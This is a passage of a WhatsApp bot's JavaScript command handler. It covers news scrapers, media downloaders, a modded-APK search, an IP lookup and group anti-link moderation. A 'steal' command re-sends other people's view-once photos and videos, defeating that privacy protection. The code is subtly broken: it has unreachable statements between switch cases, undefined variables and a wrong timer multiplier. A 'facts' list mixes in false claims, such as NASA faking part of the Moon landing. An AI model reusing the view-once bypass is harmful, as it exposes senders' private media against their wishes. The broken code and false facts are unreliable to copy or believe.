│  ◦  sᴋɪʀᴛ 
│  ◦  ʙʀᴇᴀsᴛ 
│  ◦  ᴛᴡɪɴᴛᴀɪʟ 
│  ◦  sᴘʀᴇᴀᴅᴘᴜssʏ 
│  ◦  sᴇᴇᴛʜʀᴏᴜɢʜ 
│  ◦  ʙʀᴇᴀsᴛʜᴏʟᴅ 
│  ◦  ғᴀᴛᴇsᴇʀɪᴇs 
│  ◦  sᴘʀᴇᴀᴅʟᴇɢs 
│  ◦  ᴏᴘᴇɴsʜɪʀᴛ 
│  ◦  ʜᴇᴀᴅʙᴀɴᴅ 
│  ◦  ɴɪᴘᴘʟᴇs 
│  ◦  ᴇʀᴇᴄᴛɴɪᴘᴘʟᴇs 
│  ◦  ɢʀᴇᴇɴʜᴀɪʀ 
│  ◦  ᴡᴏʟғɢɪʀʟ 
╰┈────────────────•
╭┈──────────────────
│*${m2}[ O W N E R - M E N U ‎]${m2}*
╭┈──────────────────
│  ◦   ᴄʜᴀᴛʙᴏᴛ <ᴏɴ/ᴏғғ>
│  ◦   ᴜᴘᴅᴀᴛᴇ
│  ◦   sʜᴜᴛᴅᴏᴡɴ
│  ◦   sᴇᴛʙɪᴏ 
│  ◦   ᴍᴏᴅᴇ-ᴘʀɪᴠᴀᴛᴇ
│  ◦   ᴍᴏᴅᴇ-ᴘᴜʙʟɪᴄ
│  ◦   ʀᴇᴘᴏʀᴛ
│  ◦   ᴄʟᴇᴀʀᴄʜᴀᴛ
│  ◦   sᴇᴛᴘᴘ 
│  ◦   ɢᴇᴛᴘᴘ
│  ◦   ᴄᴏᴜɴᴛᴅᴏᴡɴ
│  ◦   ʟɪsᴛʙʟᴏᴄᴋ
│  ◦   ʙʟᴏᴄᴋ
│  ◦   ᴜɴʙʟᴏᴄᴋ
│  ◦   ɢᴇᴛʙɪᴏ
│  ◦   ʀᴇsᴛᴀʀᴛ
│  ◦   ᴀᴜᴛᴏʀᴇᴀᴄᴛ <ᴏɴ/ᴏғғ>
│  ◦   ᴀᴜᴛᴏᴛʏᴘɪɴɢ    <ᴏɴ/ᴏғғ>
│  ◦   ᴀᴜᴛᴏʀᴇᴄᴏʀᴅɪɴɢ <ᴏɴ/ᴏғғ>
│  ◦   ᴀʟᴡᴀʏsᴏɴʟɪɴᴇ  <ᴏɴ/ᴏғғ>
│  ◦   ᴀᴜᴛᴏʀᴇᴀᴅ <ᴏɴ/ᴏғғ>
│  ◦   ᴜɴᴀᴠᴀɪʟᴀʙʟᴇ
│  ◦   ᴅᴇʟᴇᴛᴇ
│  ◦   ᴋɪᴄᴋ
│  ◦   ᴍᴏᴅᴇ
│  ◦   sᴜᴅᴏ
│  ◦   ᴅᴇʟsᴜᴅᴏ
│  ◦   $ 
│  ◦   =>
│  ◦   > 
│  ◦   ᴘʀᴇᴍɪᴜᴍ
│  ◦   ᴀᴅᴅᴄᴀꜱᴇ
│  ◦   ᴅᴇʟᴄᴀꜱᴇ
│  ◦   ʟɪꜱᴛᴄᴀꜱᴇ
│  ◦   ʀᴇꜱᴛᴀʀᴛ
│  ◦   ꜱᴛᴏᴘ
╰┈────────────────•`,key: m?.key,}) 
} 
break 



 case 'fajar':


FajarNews().then(async(res) => {
console.log(res) 
no = 0
iwan = ""
for (let i of res) {
no += 1
iwan += `\n• ${no.toString()} •\n`
iwan += `News: ${i.berita}\n`
iwan += `Upload: ${i.berita_diupload}\n`
iwan += `Type: ${i.berita_jenis}\n`
iwan += `Link: ${i.berita_url}\n`
}
iwan += ""
reply(iwan) 
})
break

			case 'clearchat': {
if (!isCreator) return reply('`For My Owner Only`') 
ptz.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
}
break	


case 'countdown':
    let time = parseInt(args[0]);
    if (isNaN(time)) return reply("Please provide a valid time in seconds.");
    
    const countdownInterval = setInterval(() => {
        time--;
        reply(`Time left: ${time} seconds`);
        if (time === 0) {
            clearInterval(countdownInterval);
            reply("Countdown finished!");
        }
    }, 1000);
    break;

case 'faketyping':
    const typingDuration = parseInt(args[0]) || 5; // duration in seconds
    await ptz.sendPresenceUpdate('composing', m.chat);
    setTimeout(() => {
        reply("Got you! 😂");
        ptz.sendPresenceUpdate('paused', m.chat);
    }, typingDuration * 10000);
    break;
    

    
case 'joke':
    const jokes = [
        "Why don't scientists trust atoms? Because they make up everything!",
        "What do you call fake spaghetti? An impasta!",
        // Add more jokes
    ];
    reply(jokes[Math.floor(Math.random() * jokes.length)]);
    break;
    
    

case 'fact':
await ptz.sendMessage(m?.chat, {react: {text: `🔥`,key: m?.key,}})
    const facts = [
        "Honey never spoils.",
        "A day on Venus is longer than a year on Venus.",
        "Identical twins don’t have the same fingerprints.", 
        "Earth’s rotation is changing speed.", 
        "The largest piece of fossilised dinosaur poo discovered is over 30cm long and over two litres in volume.", 
        "Animals can experience time differently from humans.", 
        "Water might not be wet.", 
        "A chicken once lived for 18 months without a head.",
        "All the world’s bacteria stacked on top of each other would stretch for 10 billion light-years", 
        "Wearing a tie can reduce blood flow to the brain by 7.5 per cent", 
        "Our solar system has a wall.", 
         "Mount Everest isn't the tallest mountain on Earth.", 
         "Our solar system has a wall.", 
         "Octopuses don’t actually have tentacles.", 
         "Most maps of the world are wrong.", 
         "NASA genuinely faked part of the Moon landing", 
         "Comets smell like rotten eggs.", 
         "Earth’s poles are moving.", 
         "You can actually die laughing", 
         "Chainsaws were first invented for childbirth", 
         "Ants don’t have lungs.", 
         "Wind turbines kill between 10,000 and 100,000 birds each year in the UK.", 
         "Snails have teeth.", 
         "Your signature could reveal personality traits.", 
         "Your signature could reveal personality traits", 
         "Bananas are radioactive", 
         "There’s no such thing as a straight line", 
         "Deaf people are known to use sign language in their sleep", 
         "Finland is the happiest country on Earth", 
         "The Moon looks upside down in the Southern Hemisphere", 
         "Bacteria on your skin cause your itches", 
         "Starfish don’t have bodies", 
         "Somebody has been constipated for 45 days",
         "You travel 2.5 million km a day around the Sun without realising.", 
         "Fish form orderly queues in emergencies.", 
         "There are more bacterial cells in your body than human cells", 
         "The world record for donut eating is held by John Haight, who ate 29 donuts (52 ounces) in a little over six minutes", 
         "The world record for donut eating is held by John Haight, who ate 29 donuts (52 ounces) in a little over six minutes",
         "Corn Flakes were invented after Will Keith Kellogg and his brother Dr. John Harvey Kellogg set about developing a nutritious cereal for the patients of a health resort in 1890", 
         "Every square inch of the human body has about 19,000,000 skin cells",
         "The trunk of an elephant can hold up to two gallons of water"
        // Add more facts
    ];
    reply(facts[Math.floor(Math.random() * facts.length)]);
    break;
    

    
 case 'meme':
    const memeUrl = "https://meme-api.com/gimme";

    try {
        const memeRes = await axios.get(memeUrl);
        const memeImg = memeRes.data.url;
        const memeTitle = memeRes.data.title;
        await ptz.sendMessage(m.chat, { image: { url: memeImg }, caption: memeTitle });
    } catch (error) {
        reply("Failed to fetch a meme.");
    }
    break;
   
    

     
 


case 'instagram': case 'ig': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {
	   if (!text) return reply(`*Example:*\\n> .${command} url`)
	   await ptz.sendMessage(m?.chat, {react: {text: `⏳`,key: m?.key,}})
await ptz.sendMessage(m?.chat, {react: {text: `📥`,key: m?.key,}}) 
 try {
 let insta = await (await fetch(`https://endpoint.web.id/downloader/instagram?key=gojou&url=${text}`)).json()
 let shannz = insta.result
 function formatComments(comments) {
 return comments.map(comment => 
 `user: ${comment.username}\nkomentar: ${comment.text}\n`
 ).join('\n');
 }
 await ptz.sendMessage(m?.chat, {react: {text: `✅`,key: m?.key,}})
 let caption = "*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ™*";
 if (shannz.videoUrl.endsWith('.jpg') || shannz.videoUrl.endsWith('.png') || shannz.videoUrl.endsWith('.webp')) {
 ptz.sendMessage(m.chat, { image: { url: shannz.videoUrl }, caption: caption }, { quoted: m });
 } else {
 ptz.sendMessage(m.chat, { video: { url: shannz.videoUrl }, caption: caption }, { quoted: m });
 }
 } catch (err) {
 reply('Enter another query or try again later')
 
 }
}
break
//=================================================//
case 'cnn':


CNNNews().then(res => {
no = 0
iwann = ""
for (let i of res) {
no += 1
iwann += `\n• ${no.toString()} •\n`
iwann += `News: ${i.berita}\n`
iwann += `Link: ${i.berita_url}\n`
}
iwann += ""
reply(iwann) 
})
break

case 'mods': case 'modapk': {
  const axios = require('axios')
  const cheerio = require('cheerio')

  async function mods(apk) {
    const url = `https://m.happymod.com/search.html?q=${apk}`

    const response = await axios.get(url)
    const html = response.data
    const $ = cheerio.load(html)

    const apps = []

    $('.app-info-list .s-app-block').each((index, element) => {
      const app = {
        creator: '`David Cyril`',
        status: 200,
        title: $(element).find('.info-wrap .nowrap a').text().trim(),
        image: $(element).find('.img img').attr('data-src'),
        downloadUrl: `https://m.happymod.com${$(element).find('.down a').attr('href')}`
      }
      apps.push(app)
      if (apps.length >= 5) return false
    })

    return apps
  }

  if (text) {
    const response = await mods(text)
    let result = ''

    response.forEach((app, index) => {
      result += `*${index + 1}*. ${app.title}:\n`
      result += `∘ Download ${app.downloadUrl}\n\n`
    })

    ptz.sendMessage(m.chat, {
      text: result,
      contextInfo: {
        externalAdReply: {
          showAdAttribution: false,
          title: `M O D S  S E A R C H`,
          body: `Looking for Cool and Free Apk Mods!`,
          sourceUrl: 'https://m.happymod.com',
          thumbnailUrl: 'https://imgur.com/a/PD8nT5X',
          mediaType: 2,
          renderLargerThumbnail: true
        }
      }
    })
  } else {
    reply(`Enter Text, *Like This Format*: .${command} minecraft`)
  }
}
break

// Define the warn count object
let warnCount = {};

case 'antilink2': {
    if (!isCreator) return reply('* ғᴏʀ ᴍʏ ᴏᴡɴᴇʀ ᴏɴʟʏ*');
    if (!m.isGroup) return reply(' ɢʀᴏᴜᴘ ᴏɴʟʏ');
    if (!isBotAdmins) return reply('ʙᴏᴛ ɴᴏᴛ ʏᴇᴛ ᴀᴅᴍɪɴ');
    if (!isAdmins) return reply('ғᴏʀ ɢʀᴏᴜᴘ ᴀᴅᴍɪɴ ᴏɴʟʏ');
    
    await loading();
    
    if (args.length < 1) return reply('`.ᴏɴ ᴛᴏ ᴇɴᴀʙʟᴇ .ᴏғғ ᴛᴏ ᴅɪsᴀʙʟᴇ`');
    
    if (args[0] === "on") {
        if (AntiLink) return reply('`Has been activated`');
        ntilink.push(from);
        reply('ᴀɴᴛɪʟɪɴᴋ ʜᴀs ʙᴇᴇɴ ᴀᴄᴛɪᴠᴀᴛᴇᴅ');
    } else if (args[0] === "off") {
        if (!AntiLink) return reply('ᴀʟʀᴇᴀᴅʏ ɪɴ-ᴀᴄᴛɪᴠᴇ');
        let off = ntilink.indexOf(from);
        ntilink.splice(off, 1);
        reply('`AntiLink Has Been Disabled`');
    } else {
        reply('`.On to enable .Off to disable`');
    }
    
    break;
}

// Link detection, auto-warn, and deletion of member who sends a link
if (m.isGroup && ntilink.includes(from)) {
    const linkRegex = /https?:\/\/[^\s]+/g;
    if (linkRegex.test(m.text)) {
        if (!isAdmins && !isCreator) {
            if (!warnCount[m.sender]) {
                warnCount[m.sender] = 1;
                await reply('⚠️ Link detected! You have been warned. One more violation and you will be removed from the group.');
            } else {
                warnCount[m.sender]++;
                if (warnCount[m.sender] >= 2) {
                    await reply('❌ You have been removed from the group for violating the no-link policy.');
                    await removeParticipant(m.chat, m.sender); // This function removes the participant
                    delete warnCount[m.sender]; // Reset warning count after removal
                }
            }
        }
    }
}


//=================================================//
case 'layarkaca':


if (!q) return reply('Judul') 
LayarKaca21(q).then(async(res) => {
no = 0
iwannn = ""
for (let i of res) {
no += 1
iwannn += `\n• ${no.toString()} •\n`
iwannn += `Film: ${i.film_title}\n`
iwannn += `Link: ${i.film_link}\n`
}
iwannn += ``
reply(iwannn) 
})
break
//=================================================//
case 'cnbc':


CNBCNews().then(async(res) => {
no = 0
iwannnn = ""
for (let i of res) {
no += 1
iwannnn += `\n• ${no.toString()} •\n`
iwannnn += `News: ${i.berita}\n`
iwannnn += `Upload: ${i.berita_diupload}\n`
iwannnn += `Link: ${i.berita_url}\n`
}
iwannnn += ""
ptz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnn }, { quoted:m })
})
break
//=================================================//
case 'tribun':


TribunNews().then(async(res) => {
no = 0
iwannnnn = ""
for (let i of res) {
no += 1
iwannnnn += `\n• ${no.toString()} •\n`
iwannnnn += `News: ${i.berita}\n`
iwannnnn += `Upload: ${i.berita_diupload}\n`
iwannnnn += `Type: ${i.berita_jenis}\n`
iwannnnn += `Link: ${i.berita_url}\n`
}
iwannnnn += ""
ptz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnn }, { quoted:m })
})
break
//=================================================//
case 'indozone':


IndozoneNews().then(async(res) => {
no = 0
iwannnnnn = ""
for (let i of res) {
no += 1
iwannnnnn += `\n• ${no.toString()} •\n`
iwannnnnn += `News: ${i.berita}\n`
iwannnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnn += `Type: ${i.berita_jenis}\n`
iwannnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnn += ""
ptz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnn }, { quoted:m })
})
break
//=================================================//
case 'kompas':


KompasNews().then(async(res) => {
no = 0
iwannnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnn += `News: ${i.berita}\n`
iwannnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnn += `Type: ${i.berita_jenis}\n`
iwannnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnn += ""
ptz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnn }, { quoted:m })
})
break
//=================================================//
case 'Secondnews':


DetikNews().then(async(res) => {
no = 0
iwannnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnn += `News: ${i.berita}\n`
iwannnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnn += ""
ptz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnn }, { quoted:m })
})
break
//=================================================//
case 'dailynews':


DailyNews().then(async(res) => {
no = 0
iwannnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnn += `News: ${i.berita}\n`
iwannnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnn += ""
ptz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnn }, { quoted:m })
})
break
//=================================================//
case 'inews':


iNews().then(async(res) => {
no = 0
iwannnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnn += `News: ${i.berita}\n`
iwannnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnn += `type: ${i.berita_jenis}\n`
iwannnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnn += ""
reply(iwannnnnnnnnn) 
})
break
//=================================================//
case 'okezone':


OkezoneNews().then(async(res) => {
no = 0
iwannnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnn += `News: ${i.berita}\n`
iwannnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnn += ""
ptz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnnnn }, { quoted:m })
})
break
//=================================================//
case 'sindo':


SindoNews().then(async(res) => {
no = 0
iwannnnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnn += `News: ${i.berita}\n`
iwannnnnnnnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnn += ""
reply(iwannnnnnnnnnnn) 
})
break
//=================================================//

//=================================================//
case 'antara':


AntaraNews().then(async(res) => {
no = 0
iwannnnnnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnnn += `News: ${i.berita}\n`
iwannnnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnnn += `type: ${i.berita_jenis}\n`
iwannnnnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnnnn += ""
ptz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnnnnnnn }, { quoted:m })
})
break
//=================================================//
case "kontan":


KontanNews().then(async (res) => {
iwannnnnnnnnnnnnnn = ""
no = 0
for (let i of res) {
no += 1
iwannnnnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnnnn += `News: ${i.berita}\n`
iwannnnnnnnnnnnnnn += `type: ${i.berita_jenis}\n`
iwannnnnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnnnnn += ""
ptz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnnnnnnnn }, { quoted:m })
})
break

case 'twitter': {
const axios = require('axios');
const cheerio = require('cheerio');
const qs = require('qs');
  if (!text) return reply('Please give me a Twitter video link!');
//avosky
  async function avzz(link) {
    return new Promise((resolve, reject) => {
      let config = { 'URL': link };
//avosky
      axios.post('https://twdown.net/download.php', qs.stringify(config), {
        headers: {
          "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
          "sec-ch-ua": '" Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"',
          "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
          "cookie": "_ga=GA1.2.1388798541.1625064838; _gid=GA1.2.1351476739.1625064838; __gads=ID=7a60905ab10b2596-229566750eca0064:T=1625064837:RT=1625064837:S=ALNI_Mbg3GGC2b3oBVCUJt9UImup-j20Iw; _gat=1"
        }
      })
      .then(({ data }) => {
        const $ = cheerio.load(data);
        resolve({
          desc: $('div:nth-child(1) > div:nth-child(2) > p').text().trim(),
          thumb: $('div:nth-child(1) > img').attr('src'),
          video_hd: $('tbody > tr:nth-child(1) > td:nth-child(4) > a').attr('href'),
        });
      })
      .catch(reject);
    });
  }
//avosky
  try {
    await loading();
    let res = await avzz(text);
    if (res.video_hd) {
      let avox = res.desc.replace(/https:\/\/t.co\/[a-zA-Z0-9]+/gi, '').trim();
      await ptz.sendFile(m.chat, res.video_hd, '', avox, m);
    } else {
      reply('Error While Processing Your Request!');
    }
  } catch (e) {
    reply(`Error: ${e}`);
  }
}
break





 
//=================================================//
case "merdeka":


MerdekaNews().then(async (res) => {
iwannnnnnnnnnnnnnnn = ""
no = 0
for (let i of res) {
no += 1
iwannnnnnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnnnnn += `News: ${i.berita}\n`
iwannnnnnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnnnnnn += ""
ptz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnnnnnnnnn }, { quoted:m })
})
break
//=================================================//
case "jalantikus":

var reis = await JalanTikusMeme()
tekcs = ""
tekcs += "Jalan Tikus Meme\n\n"
tekcs += `Source: ${reis}`
tekcs += ""
ptz.sendMessage(m.chat, { image : { url : reis }, caption: tekcs }, { quoted:m })
break

const axios1 = require('axios');

case 'checkip':
  
  const apiUrlIpify = 'https://api.ipify.org?format=json';

  try {
    // Step 1: Get public IP from ipify
    const ipifyResponse = await axios1.get(apiUrlIpify);
    const ipAddress = ipifyResponse.data.ip;

    // Step 2: Use the IP address to get geolocation data from ip-api
    const apiUrlIpApi = `http://ip-api.com/json/${ipAddress}`;
    const ipApiResponse = await axios.get(apiUrlIpApi);
    const locationData = ipApiResponse.data;

    if (locationData.status === "fail") {
      return reply(`Error: ${locationData.message}`);
    }

    const message = `
    Public IP: ${ipAddress}\n
    Country: ${locationData.country}\n
    Region: ${locationData.regionName}\n
    City: ${locationData.city}\n
    Latitude: ${locationData.lat}\n
    Longitude: ${locationData.lon}\n
    ISP: ${locationData.isp}\n
    Timezone: ${locationData.timezone}\n
  `;

    ptz.sendMessage(from, { text: message }, { quoted: m });
  } catch (error) {
    console.error('Error fetching IP data:', error);
    reply('Failed to fetch IP location data. Please try again later.');
  }
  break;

 
        
case 'open': case 'steal': {
if (!m.quoted) return reply(`Reply view once message to use this command`)
let typeS = Object.keys(m.quoted.message)[0]
let quotedType = m.quoted.message[typeS]
var mediaaaaaaaaaa = await downloadContentFromMessage(quotedType, typeS == "imageMessage" ? "image" : "video")
let buffer = Buffer.from([])
for await (let chunk of mediaaaaaaaaaa) {
buffer = Buffer.concat([buffer, chunk])
}
if (/video/.test(type)) {
await ptz.sendMessage(m.chat, { video: buffer, caption: quotedType.caption }, {quoted: m })
} 
else if (/image/.test(type)) {
await ptz.sendMessage(m.chat, { image: buffer, caption: quotedType.caption }, {quoted: m })
}
}
break;
// anti
        case 'antilinkgc': {
if (!isCreator) return reply('You are not the Owner')
if (!m.isGroup) return reply('Make it in the Stupid Group')
if (!isBotAdmins) return reply('Bot Not Admin')
//if (!isAdmins) return reply('Considered Kali Group Admin')

if (args.length < 1) return reply('type on to enable\type off to disable')
if (args[0] === "on") {
if (AntiLink) return reply('Already Active')
ntilink.push(from)
reply('Success in turning on antilink in this group')
} else if (args[0] === "off") {
if (!AntiLink) return reply('Already Mati')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
reply('Success in turning off antilink in this group')
} else {
reply('on to activate, off to deactivate')
}
}
break
case 'antiwame': {
if (!isGroup) return reply(`Only in Group`)
if (!isBotAdmins) return reply(`The bot must be an admin`)
if (!isAdmins && !isCreator) return reply("Admin only")
//if (!isAdmins && !isOwner) return reply(`Specifically my admin & owner`)
if (args[0] === "on") {
if (antiWame) return reply('Already activated')
ntwame.push(from)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
reply('Success in turning on antiwame in this group')
var groupe = await haikal.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
haikal.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send wa.me in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiWame) return reply('Already deactivated')
let off = nttoxic.indexOf(from)
ntwame.splice(off, 1)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
reply('Success in turning off antiwame in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break     
case 'antilinkyoutubevideo': case 'antilinkyoutubevid': case 'antilinkytvid': {
if (!m.isGroup) return reply(`Only In Group`)
if (!isBotAdmins) return reply(`Bot bukan admin`)
if (!isAdmins && !isCreator) return reply("Admin only")
//if (!isAdmins && !isOwner) return reply(`Specifically my admin & owner`)
if (args[0] === "on") {
if (AntiLinkYoutubeVid) return reply('Already activated')
ntilinkytvid.push(from)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
reply('Success in turning on youtube video antilink in this group')
var groupe = await haikal.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
haikal.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube video link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeVid) return reply('Already deactivated')
let off = ntilinkytvid.indexOf(from)
ntilinkytvid.splice(off, 1)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
reply('Success in turning off youtube video antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
    case 'antilinkyoutubech': case 'antilinkyoutubechannel': case 'antilinkytch': {
if (!m.isGroup) return reply(`Only In Group`)
if (!isBotAdmins) return reply(`Bot bukan admin`)
if (!isAdmins && !isCreator) return reply("Admin only")
//if (!isAdmins && !isOwner) return reply(`Specifically my admin & owner`)
if (args[0] === "on") {
if (AntiLinkYoutubeChannel) return reply('Already activated')
ntilinkytch.push(from)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
reply('Success in turning on youtube channel antilink in this group')
var groupe = await haikal.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
haikal.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube channel link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeChannel) return reply('Already deactivated')
let off = ntilinkytch.indexOf(from)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
ntilinkytch.splice(off, 1)
reply('Success in turning off youtube channel antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
    case 'antilinkfacebook': case 'antilinkfb': {
if (!m.isGroup) return reply(`Only In Group`)
if (!isBotAdmins) return reply(`Bot bukan admin`)
if (!isAdmins && !isCreator) return reply("Admin only")
//if (!isAdmins && !isOwner) return reply(`Specifically my admin & owner`)
if (args[0] === "on") {
if (AntiLinkFacebook) return reply('Already activated')
ntilinkfb.push(from)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
reply('Success in turning on facebook antilink in this group')
var groupe = await haikal.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
haikal.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the facebook link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkFacebook) return reply('Already deactivated')
let off = ntilinkfb.indexOf(from)
ntilinkfb.splice(off, 1)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
reply('Success in turning off facebook antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
          case 'antilinktele': case 'antilinktg': {
if (!m.isGroup) return reply(`Only In Group`)
if (!isBotAdmins) return reply(`Bot bukan admin`)
if (!isAdmins && !isCreator) return reply("Admin only")
//if (!isAdmins && !isOwner) return reply(`Owner & Group Admin only`)
if (args[0] === "on") {
if (AntiLinkTelegram) return reply('Already activated')
ntilinktg.push(from)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
reply('Success in turning on telegram antilink in this group')
var groupe = await haikal.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
haikal.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the telegram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTelegram) return reply('Already deactivated')
let off = ntilinktg.indexOf(from)
ntilinktg.splice(off, 1)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
reply('Success in turning off telegram antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
            case 'antilinktiktok': case 'antilinktt': {
if (!m.isGroup) return reply(`Only In Group`)
if (!isBotAdmins) return reply(`Bot bukan admin`)
if (!isAdmins && !isCreator) return reply("Admin only")
//if (!isAdmins && !isOwner) return reply(`Owner & Group Admin only`)
if (args[0] === "on") {
if (AntiLinkTiktok) return reply('Already activated')
ntilinktt.push(from)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
reply('Success in turning on tiktok antilink in this group')
var groupe = await haikal.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
haikal.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the tiktok link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTiktok) return reply('Already deactivated')
let off = ntilinktt.indexOf(from)
ntilinktt.splice(off, 1)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
reply('Success in turning off tiktok antilink in this group')
} else {
